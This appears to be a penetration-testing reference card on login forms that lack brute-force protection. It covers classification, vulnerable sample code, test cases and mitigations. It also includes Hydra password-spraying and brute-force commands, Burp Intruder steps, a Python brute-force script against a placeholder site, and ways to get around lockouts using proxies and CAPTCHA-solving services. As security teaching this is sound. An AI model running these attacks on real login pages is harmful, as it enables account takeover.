📌 No Brute Force Protection on Login

🧠 Description

What is missing brute force protection?

The application lacks rate limiting, CAPTCHA, or account lockout mechanisms. Attackers can attempt thousands of password combinations without restriction, leading to account compromise.

Why does it occur?

Developers often focus on functionality first, forgetting to implement controls against automated attacks. Also, some applications rely on client‑side protections that are easily bypassed.

Security principle violated: Defense in Depth / Rate Limiting

Real-world analogy: A door with no lock and unlimited tries – anyone can keep guessing the code until they get in.

🏷️ Classification

  • Type: Broken Authentication
  • OWASP: A07:2021 – Identification and Authentication Failures
  • CWE: CWE-307: Improper Restriction of Excessive Authentication Attempts

🎯 Attack Surface (Where to Test)

  • ✅ Login form
  • ✅ Password reset endpoint
  • ✅ OTP verification page
  • ✅ API login endpoints
  • ✅ Registration (prevention of automated account creation)

🔍 Detection Methodology

1. Static Analysis

// Vulnerable code – no rate limiting
def login(request):
    user = request.POST['user']
    passwd = request.POST['pass']
    if authenticate(user, passwd):
        return redirect('/dashboard')
    else:
        return render('login.html', {'error':'Invalid'})

2. Dynamic Analysis

  • Send multiple login attempts with wrong passwords (e.g., 50 requests).
  • Check if CAPTCHA appears, if account gets locked, or if response time increases.
  • Use Burp Intruder to automate attempts and monitor response codes.

💣 Basic Payloads

# Brute force wordlist sample
admin
password
123456
letmein
welcome

🚀 Advanced Payloads / Bypass

# Password spraying (try one common password across many usernames)
hydra -L users.txt -p "Winter2025" target.com http-post-form "/login:user=^USER^&pass=^PASS^:F=Invalid"

# Distributed brute force (multiple IPs) to avoid IP‑based rate limiting

🧪 Test Cases (STRICT)

StepActionExpectedActual
1Send 10 failed login attemptsCAPTCHA or lockoutNo restriction
2Send 100 failed attemptsTemporary blockAlways "Invalid credentials"

✔ Must be reproducible

⚙️ Exploitation Steps

  1. Capture a login request in Burp Suite.
  2. Send to Intruder, set password as payload position.
  3. Load a wordlist (e.g., rockyou.txt).
  4. Start attack – monitor for any successful login (200 OK different from normal).
  5. If successful, account is compromised.

🛡️ Mitigation

✅ Implement rate limiting (e.g., 5 attempts per minute per IP).
✅ Account lockout after 5‑10 failed attempts (temporary or permanent).
✅ Use CAPTCHA after multiple failures.
✅ Log and monitor brute force attempts.
✅ Require multi‑factor authentication (MFA).
✅ Use Web Application Firewall (WAF) to detect brute force patterns.

🔓 Mitigation Bypass

  • If lockout is based on IP, use rotating proxies or VPNs.
  • If lockout is based on username, perform password spraying (one password, many users).
  • If CAPTCHA is weak or absent, use automated solving services.

⚠️ Risk / Impact

Severity: High

Impact: Account takeover, credential stuffing success, unauthorized access, data theft.

📎 Proof of Concept (PoC)

# Hydra brute force
hydra -l admin -P rockyou.txt target.com http-post-form "/login:user=^USER^&pass=^PASS^:F=error"

# Python script
import requests
for password in open("rockyou.txt"):
    r = requests.post("https://target.com/login", data={"user":"admin","pass":password.strip()})
    if "Welcome" in r.text:
        print(f"Found: {password}")
        break
